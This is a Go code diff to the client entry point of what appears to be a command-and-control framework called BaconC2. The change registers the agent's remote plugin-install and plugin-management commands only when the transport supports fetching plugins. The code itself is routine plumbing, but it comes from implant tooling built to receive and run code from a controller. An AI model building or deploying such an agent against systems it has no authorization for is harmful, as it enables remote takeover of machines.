@@ -17,6 +17,7 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
 	clientplugins "github.com/RabbITCybErSeC/BaconC2/client/core/plugins"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/state"
+	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	httptransport "github.com/RabbITCybErSeC/BaconC2/client/core/transport/http"
 	wstransport "github.com/RabbITCybErSeC/BaconC2/client/core/transport/websocket"
 	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
@@ -78,29 +79,36 @@ func main() {
 
 	pluginManager := plugins.NewInMemoryPluginManager(commandRegistry, agentState)
 
-	pluginCommands := clientplugins.NewPluginCommands(pluginManager, httpTransport)
-	commandRegistry.RegisterHandler(command_handler.CommandHandler{
-		Name:    "plugin_install",
-		Handler: pluginCommands.HandlePluginInstall,
-	})
-	commandRegistry.RegisterHandler(command_handler.CommandHandler{
-		Name:    "plugin_unload",
-		Handler: pluginCommands.HandlePluginUnload,
-	})
-	commandRegistry.RegisterHandler(command_handler.CommandHandler{
-		Name:    "plugin_list",
-		Handler: pluginCommands.HandlePluginList,
-	})
-	commandRegistry.RegisterHandler(command_handler.CommandHandler{
-		Name:    "plugin_status",
-		Handler: pluginCommands.HandlePluginStatus,
-	})
-	commandRegistry.RegisterHandler(command_handler.CommandHandler{
-		Name:    "plugin_info",
-		Handler: pluginCommands.HandlePluginInfo,
-	})
-
-	logging.Info("Plugin system initialized (%d plugins loaded)", pluginManager.GetRegistry().Count())
+	// Plugin fetching is only available if the transport implements IPluginFetcher
+	// For now: Not all transports can support this (e.g., UDP, DNS, ICMP)
+	var pluginCommands *clientplugins.ClientPluginCommands
+	if fetcher, ok := httpTransport.(transport.IPluginFetcher); ok {
+		pluginCommands = clientplugins.NewPluginCommands(pluginManager, fetcher)
+		commandRegistry.RegisterHandler(command_handler.CommandHandler{
+			Name:    "plugin_install",
+			Handler: pluginCommands.HandlePluginInstall,
+		})
+		commandRegistry.RegisterHandler(command_handler.CommandHandler{
+			Name:    "plugin_unload",
+			Handler: pluginCommands.HandlePluginUnload,
+		})
+		commandRegistry.RegisterHandler(command_handler.CommandHandler{
+			Name:    "plugin_list",
+			Handler: pluginCommands.HandlePluginList,
+		})
+		commandRegistry.RegisterHandler(command_handler.CommandHandler{
+			Name:    "plugin_status",
+			Handler: pluginCommands.HandlePluginStatus,
+		})
+		commandRegistry.RegisterHandler(command_handler.CommandHandler{
+			Name:    "plugin_info",
+			Handler: pluginCommands.HandlePluginInfo,
+		})
+		logging.Info("Plugin system initialized with remote fetching support (%d plugins loaded)", pluginManager.GetRegistry().Count())
+	} else {
+		logging.Warn("Transport does not support plugin fetching - plugin_install command unavailable")
+		logging.Info("Plugin system initialized in local-only mode (%d plugins loaded)", pluginManager.GetRegistry().Count())
+	}
 
 	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, httpTransport, wsTransport, cfg, commandRegistry, agentState)
 	client := agent.NewAgentClient(cfg, httpTransport, commandExecutor, cmdQueue, resultQueue)
